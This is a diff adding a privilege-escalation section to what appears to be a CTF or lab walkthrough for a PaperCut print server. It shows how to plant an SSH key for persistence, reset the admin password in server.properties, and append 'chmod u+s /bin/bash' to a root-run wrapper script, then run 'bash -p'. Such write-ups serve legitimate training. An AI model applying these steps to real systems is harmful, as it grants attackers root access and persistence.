@@ -25,3 +25,51 @@
     - Copy the public key (usually in the .ssh/ directory saved as something like `id_rsa.pub`) and add it to the target.
     - To do the adding, first create the .ssh directory in the user's home (if it doesnt exist already) and save this public key that you copied into a file named authorized_keys.
     - This sets up persistence. So you can just use your private key to connect.
+
+
+## Privilege Escalation
+
+Check out this [reddit post](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/)
+
+Now on the /home/papercut/server/server.properties page, I set the admin password to `admin`, all you need to do is replace the whole value there with your necessary password.
+
+For me I did,
+`admin.password=admin`
+
+Now here, we need to go to the print queues. On checking for running processes, perdiocically we can see this file **/home/papercut/server/bin/linux-x64/server-command** being run. So we will leverage this to gain root.
+
+So all we need to do is to make bash suid to make it run. So I did this
+
+```bash
+#!/bin/sh
+#
+# (c) Copyright 1999-2013 PaperCut Software International Pty Ltd
+#
+# A wrapper for server-command
+#
+
+. `dirname $0`/.common
+
+export CLASSPATH
+${JRE_HOME}/bin/java \
+        -Djava.io.tmpdir=${TMP_DIR} \
+        -Dserver.home=${SERVER_HOME} \
+        -Djava.awt.headless=true \
+        -Djava.locale.providers=COMPAT,SPI \
+        -Dlog4j.configurationFile=file:${SERVER_HOME}/lib/log4j2-command.properties \
+        -Xverify:none \
+	biz.papercut.pcng.server.ServerCommand \
+	"$@"
+
+chmod u+s /bin/bash
+
+```
+
+Just append `chmod u+s /bin/bash` to the file and you're good.
+
+So go to this url `http://[your_tgt_ip]:9191/app?service=page/PrintDeploy`, go to **Import BYOD Friendly print queues** > **next** > **start importing....** > **Refresh Servers**.
+
+
+This will run the binary and make bash privileged.
+
+Then just do `/bin/bash -p`
